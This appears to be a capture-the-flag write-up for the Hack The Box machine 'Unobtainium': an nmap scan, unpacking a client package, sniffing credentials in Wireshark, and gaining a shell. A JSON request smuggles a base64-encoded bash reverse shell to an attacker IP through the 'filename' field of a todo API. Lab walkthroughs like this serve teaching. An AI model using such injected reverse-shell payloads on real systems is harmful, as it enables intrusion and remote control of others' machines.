![image](https://user-images.githubusercontent.com/68326057/117915955-e26cff80-b303-11eb-976a-e743ab7d0be1.png)

# NMAP

```bash
PORT      STATE SERVICE          REASON  VERSION

22/tcp    open  ssh              syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqQoIYywQexchBNxvkmbTD5YrmVL0Av7gqOZOkIH/NlON3YEFKE+CjzkWQSpygHj5kXW/HqtpWhBcnnZwTkDNQiGG3kYrUAVBBOUYCFw0IrX+NMvsiYckoqyR6OMvgGflgqxBTykWj5tkBHlV1Uz2x5pwyjR061PyMgmcn4ATNdf6pizjeQySuiVH5rve7tvsCIK7LSxKeR+mfP4G6HdK4UMHb3SNeqBhgNTjfuew+ec22z1/lb7pzsMLZtNijWS1kZpkXldzSWD2XWZYFiLM/OgG74PT8Pbf7RDbRpgWFfBHbaKCc/2p7pgjW7g9OZf/k2Woe6iyac/AoqyEUbh/X1QJkGMZqlFjR399hLejC6QyuCajBK2D6wehgTzxWYJdHjezm/iPFPhAtum9VF4xoPtXUO3RHAh0JXC8UUvhZEPEHjhfj6ns9Ruh9JqypQMSK9a8M8apCqeKs+LA2/Bslj2MKvO3JREWOlx77D9u38VwXtsG2bMfr7wYu/NdSBA8=
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWJvi96HVMqkKOySFUH2Ct8q1P9RcMdo85OflQab5qmcuhb+7m/9V60biP3ka+vED7gwOasVRzarVF9fsHOFxk=
|   256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJiTwECN1nK0xyLk3SQMUVcfuqvlVJmdMUGkr6hnoZ9b

80/tcp    open  http             syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium

2379/tcp  open  ssl/etcd-client? syn-ack
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   bf49 c77d 7900 011e 603c 26f5 9620 af5d
| SHA-1: 3ad8 d245 3655 0459 3cae 0454 0992 b85d c7ca 7531
| -----BEGIN CERTIFICATE-----
| MIIDPzCCAiegAwIBAgIIF2LniMomOIIwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
| AxMHZXRjZC1jYTAeFw0yMTAxMTcwNzEwMzBaFw0yMjAxMTcwNzEwMzBaMBYxFDAS
| BgNVBAMTC3Vub2J0YWluaXVtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEA7B9EZw+4RWERLnRsyNPs3Ju8RNSa868ZAkVcB5IWMpLj6lPzOUU0lDgZOiQQ
| q7x5lPB6GL8vwMubVlFzZb4lUD/kt1w7u0TMLGMd5I7ZF13ZqnCQw+cLrqRL3hl+
| Rwtg6gQMwIUy1ZQ62ojfDQcIPPn2Z1FtzhsQ1avHnUSdwE5xfI7sP1ptg+fSzJuy
| fz181DkEd52iv163GL2HbcaeZRAIIJ1+51haUhA7hZ1ExJ1uk+HUG8GForudzqHd
| OPQQJw/srK/ZPIRPDzFY9I0FUtV2l4ArtoQ3v6Gnyi1mTmtLNeSZi1mQXoRX1+RL
| 4g9xt4VQKqm0z4ChQNNnKPj6LQIDAQABo4GUMIGRMA4GA1UdDwEB/wQEAwIFoDAd
| BgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwHwYDVR0jBBgwFoAUsBcJTW6z
| tOAyGyZVLRT0mjItXikwPwYDVR0RBDgwNoIJbG9jYWxob3N0ggt1bm9idGFpbml1
| bYcECgoKA4cEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkqhkiG9w0BAQsFAAOC
| AQEAB3ZKDHqbV8fDfE2QXjOSiOoNv6g4XR4fo1EA3m9s2E+Exhqqy4Ep/Jm9bsZE
| 4g+gXSChX1seTU+9BQs4kVPSnFQvUibuYuNI30xzY3DipgG8MbDM/S2U65PcHD+4
| s4eLic+bbKpORnKhFKWyNDSCcm9CzKMn16fiyWoppfq7cfb7hG0d9/UrDWmhSW0O
| goR/ApYlshpdQweZrygD4aZfdQqOrK331D1XcmExPrk1GgMWxmZe4QU5uufWd2VE
| CAz/yI3wD7XZ1RTQOj9ysKoJRjcPaTyWFkG1deeF7oREGwnklu3l6k7XdiC/yJ8e
| XWd+EfjNgnbpZ7gBqeEpjWwJGw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2

2380/tcp  open  ssl/etcd-server? syn-ack
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   f920 4337 4559 aad2 fd5c 41bf 0b9c 827c
| SHA-1: 729f 3481 33c5 eaba 5922 1b34 8bb8 e052 a107 a521
| -----BEGIN CERTIFICATE-----
| MIIDPzCCAiegAwIBAgIIL67aFgTRTcgwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UE
| AxMHZXRjZC1jYTAeFw0yMTAxMTcwNzEwMzBaFw0yMjAxMTcwNzEwMzBaMBYxFDAS
| BgNVBAMTC3Vub2J0YWluaXVtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEA7gewfPGikwZGQEM/hJSb/regA7VV1k9wLcymY8Ugur01i1/fP0y+fCnC60NS
| gVSe2km07t185lE4DsdfN+RxT9UeSV54B+G/Tode9OtLncK8EOA4Sly9wQ/5fI3p
| XGhrVsZiNNkcyrpg1aMWWQUo770R34Mg4IAVLHwHz2Y7ArEnNki3YMVUutwx2Uyu
| 4YUeBTtPwX/1mtYYwEScN1q15rkUmu46zf2Lvlfhmgg6gQ2dD5M5gKGeHJyli4Z0
| 0yHR3yDd3ggUlwJp6hUo8JbDNMkfz8rs95IDc7vS7+Q2VT6jCgDACeYRntlLIMYi
| PfTxgzfT+wDjM7Oeljcf/7vB2QIDAQABo4GUMIGRMA4GA1UdDwEB/wQEAwIFoDAd
| BgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwHwYDVR0jBBgwFoAUsBcJTW6z
| tOAyGyZVLRT0mjItXikwPwYDVR0RBDgwNoIJbG9jYWxob3N0ggt1bm9idGFpbml1
| bYcECgoKA4cEfwAAAYcQAAAAAAAAAAAAAAAAAAAAATANBgkqhkiG9w0BAQsFAAOC
| AQEAa0J6bA2x4v3azqTnrZVrxGSfyOK4qS/KsFZmbqoMp5NCiMNKICIQYwK3HiIp
| 5r+kELj3Jqqrn/OhJx+0+/WqjX0HHB1wC6I2qndRzU0IVTeJ3ysEzYQ1La1e7PHF
| z7J3g3Nh+aQjE4WU+i/R3DZE+s+NuEopAzue6bjXCAhlumgdFdCO1pDuf/A1g/DT
| yVOKvJGhNcm1DdQb7av/fCRYrShv2yrJQY3IjNgN3Jp4LlL2R70U/yhcNcbq18MH
| B2dI/y4atdMo3BTQoHWrXsAv36+LROqWmgc/JR1jw4IoOTxtAQoqkpX4ul+89hoC
| 7AneKLB4w6xu2cP1r7uDOqYTKA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2

8443/tcp  open  ssl/https-alt    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 12 May 2021 04:04:04 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 12 May 2021 04:04:02 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 12 May 2021 04:04:03 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-11T04:00:28
| Not valid after:  2022-05-12T04:00:28
| MD5:   5952 259e bd95 f598 0c69 ee12 24be 29f5
| SHA-1: 56c8 fa66 ab35 1f72 8a4c cf79 70c2 cc00 38d7 1cbf
| -----BEGIN CERTIFICATE-----
| MIIDuTCCAqGgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
| a3ViZUNBMB4XDTIxMDUxMTA0MDAyOFoXDTIyMDUxMjA0MDAyOFowLDEXMBUGA1UE
| ChMOc3lzdGVtOm1hc3RlcnMxETAPBgNVBAMTCG1pbmlrdWJlMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Epmzo6weqqwoNtR+dtOoiQYQp03hu7miUVI
| anowfNUSI7bwyy+NCchLECQb4DLW05TD3Dmdcqi462YynJylqs4qRTukuBJfmV0L
| dEU3VUxFC3f413aA4DNr9CHo9GPA1aihxZKrMe4ZKyR3HXADZredA4SLjdRPAiE3
| P01HH1KE0M4L/ONYvYBJhmF8VGturlleu4Y4aN7bpWeeQKakcSnagkfNbJjWxeOo
| cjUeIdXzFQtxZJ8hwy2iTbybW4vYhd5BuXEGavfrh6QUuLPcw/gHniL6W1bWwe+k
| 5q2ATO+bfsXfDZs7wiRpeVZ3nhqRadO5JPgHcJhq4X86bSevtQIDAQABo4H8MIH5
| MA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIw
| DAYDVR0TAQH/BAIwADCBuQYDVR0RBIGxMIGuggptaW5pa3ViZUNBgh9jb250cm9s
| LXBsYW5lLm1pbmlrdWJlLmludGVybmFsgiRrdWJlcm5ldGVzLmRlZmF1bHQuc3Zj
| LmNsdXN0ZXIubG9jYWyCFmt1YmVybmV0ZXMuZGVmYXVsdC5zdmOCEmt1YmVybmV0
| ZXMuZGVmYXVsdIIKa3ViZXJuZXRlc4IJbG9jYWxob3N0hwQKCgrrhwQKYAABhwR/
| AAABhwQKAAABMA0GCSqGSIb3DQEBCwUAA4IBAQCU53KaSKoC9dx4aS7EUQRgjFmE
| u23eq2n2mlAmPU8VVexY0ugTKobygxfmiQSwn6VJyIwLzG+Qg9VYGapnbs+v2o/r
| gJVM/RgwHeDYe/mHyQF7Ldx+v0IeJ4fIt8RaD/em6UjRCiyM0rjTRIqokMSPp3FS
| ELJlwAc4NeI+Nf2f0CbH0I5DFrYErr2I9L45fjJzC2mY30yafA8kO4GokPldvb3I
| pVed4QxghA5vrSIMm8HxMh/CwiGDUnUWUHliRivLabmikjubObXoKD9n8lMFRmh/
| x7j1yDs+HXpC9oHwwiCTYlDMiWRag2fyZLD7oES4Hx5en868ja89kVrLHz53
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1

10249/tcp open  http             syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

10250/tcp open  ssl/http         syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Issuer: commonName=unobtainium-ca@1610865428
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T05:37:08
| Not valid after:  2022-01-17T05:37:08
| MD5:   fa5f 3f5c 5f93 30d2 5105 2aad 71a4 96f6
| SHA-1: d67f 5a73 83b7 2393 1612 e88a 12c5 6bf1 9552 36b3
| -----BEGIN CERTIFICATE-----
| MIIDLjCCAhagAwIBAgIBAjANBgkqhkiG9w0BAQsFADAkMSIwIAYDVQQDDBl1bm9i
| dGFpbml1bS1jYUAxNjEwODY1NDI4MB4XDTIxMDExNzA1MzcwOFoXDTIyMDExNzA1
| MzcwOFowITEfMB0GA1UEAwwWdW5vYnRhaW5pdW1AMTYxMDg2NTQyODCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKLp7yOzZ9fFc0QY6U4NWcENvqmPv4k0
| IoSgagI15waulf/H1TKaehSOKRYHS3mEeRuhN4a1gheNclZL4jCtF2DeDx9R9EpX
| c6b6GeEwWddnWWCuavOu4k94onyRfxiXYdu/dC7CSXjzr8RRsBpq5bU6ZGChMYDb
| +jTaWCzpQoQn1en4uxg0tmN6stwyhKqYA+zfkeE4Rtqo7T6pZnBb9rHMpPtL1VWd
| Degq47wJeOpzNcWNvPI6/3/w/FLCVkYDa1X+oTITEPIYoFeelNSlC8AIZ+T4j4B4
| o8vMzMm1lLULZzbBCcZ8oCx8WEMIb3vO0dy3ktWrZwO2MQCIHT03+FcCAwEAAaNu
| MGwwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB
| /wQCMAAwHwYDVR0jBBgwFoAUARx4OH5btad3F83FBn3HpSt62DswFgYDVR0RBA8w
| DYILdW5vYnRhaW5pdW0wDQYJKoZIhvcNAQELBQADggEBAKxmllh9QumypVZ4eicO
| aOKTDGJsNZa3T53Y6xlbsTN4I3GS79Gdr79tLQSnffjW7xuCqmyYC8UNn1ym1FbN
| L8KDx8Djfrl9tQ/g5esmENA6+uOFVnTs5znQnaF+QoQ93asLXYHjmcFxUANwD8HG
| D5dU9ngPemSNWL671SMRnCQtzulu6W+Y+RMT7PA/DU1nxXPsycfkDZBEjiffRyzE
| 7SkeAkqqFnIV7z1yM6kudw3bYRkxhOJ8iL73u0BwfESq086kOkyRBVw2Z7uisWxm
| U8nCksR4q11LT+GpHS2cTrGzM5HYOAiDVR0inhYWwtHRmKShvm7THEoS3aIGyQUP
| Bz8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1

10256/tcp open  http             syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

31337/tcp open  http             syn-ack Node.js Express framework
| http-methods: 
|   Supported Methods: GET HEAD PUT DELETE POST OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=5/12%Time=609B9F6A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,1FF,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20
SF:no-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Content-
SF:Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x203082aa7f
SF:-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20c
SF:4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2012\x20May\x2020
SF:21\x2004:04:02\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Stat
SF:us\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"mes
SF:sage\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20ge
SF:t\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code
SF:\":403}\n")%r(HTTPOptions,203,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-C
SF:ontrol:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\
SF:nX-Content-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\
SF:x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Priorityleve
SF:l-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2012\x
SF:20May\x202021\x2004:04:03\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"ki
SF:nd\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Fail
SF:ure\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20c
SF:annot\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"deta
SF:ils\":{},\"code\":403}\n")%r(FourOhFourRequest,21A,"HTTP/1\.0\x20403\x2
SF:0Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x
SF:20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kubernete
SF:s-Pf-Flowschema-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kuber
SF:netes-Pf-Prioritylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\n
SF:Date:\x20Wed,\x2012\x20May\x202021\x2004:04:04\x20GMT\r\nContent-Length
SF::\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\"
SF::{},\"status\":\"Failure\",\"message\":\"forbidden:\x20User\x20\\\"syst
SF:em:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\x20ports,/Trinit
SF:y\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}
SF:\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

![image](https://user-images.githubusercontent.com/68326057/117918581-ee0ef500-b308-11eb-80b4-565dda196218.png)

# REV

```bash
--> unzip unobtainium_debian
--> mkdir packge
--> dpkg-deb -xv unobtainium_1.0.0_amd64.deb packge
```

![image](https://user-images.githubusercontent.com/68326057/117918950-bc4a5e00-b309-11eb-9c60-fcf0a8faf704.png)

```bash
In packge/opt/unobtainium there is an executable.
```

![image](https://user-images.githubusercontent.com/68326057/117919391-878ad680-b30a-11eb-95d2-636ec5390f42.png)


```bash
./unobtainium
```

![image](https://user-images.githubusercontent.com/68326057/117919348-780b8d80-b30a-11eb-9bbc-e04cbc987c98.png)

Add unobtainium.htb to your /etc/hosts.

![image](https://user-images.githubusercontent.com/68326057/117919652-05e77880-b30b-11eb-87ef-a97fca0b4409.png)

viewing packets transfer using wireshark

![image](https://user-images.githubusercontent.com/68326057/117919873-77272b80-b30b-11eb-9d51-b587740cd46b.png)

![image](https://user-images.githubusercontent.com/68326057/117919902-84441a80-b30b-11eb-9e56-2e4cf84b7bfa.png)

```bash
felamos:Winter2021
```

![image](https://user-images.githubusercontent.com/68326057/117919969-a89ff700-b30b-11eb-9a28-906687f4f2a4.png)

I look again in wireshark and found this:-

![image](https://user-images.githubusercontent.com/68326057/117920386-67f4ad80-b30c-11eb-977e-0834137f8304.png)

Tried this:-
```bash
curl -s -H 'Accept: application/json' -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":""}' http://unobtainium.htb:31337/todo
```

```bash
{"ok":false,"error":"Access denied"}
```

![image](https://user-images.githubusercontent.com/68326057/117922492-2f56d300-b310-11eb-9fad-2202ccf359a4.png)

![image](https://user-images.githubusercontent.com/68326057/117924036-befd8100-b312-11eb-9429-316a0c650256.png)

![image](https://user-images.githubusercontent.com/68326057/117924277-1ef42780-b313-11eb-954a-59a123a1d5b0.png)

```json
{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1' | base64) | base64 -d | bash"}
```

# USER

![image](https://user-images.githubusercontent.com/68326057/117924338-34695180-b313-11eb-848f-60030bea7095.png)

user.txt is in root

![image](https://user-images.githubusercontent.com/68326057/117924788-e9037300-b313-11eb-8e38-b5fbfa9c736b.png)



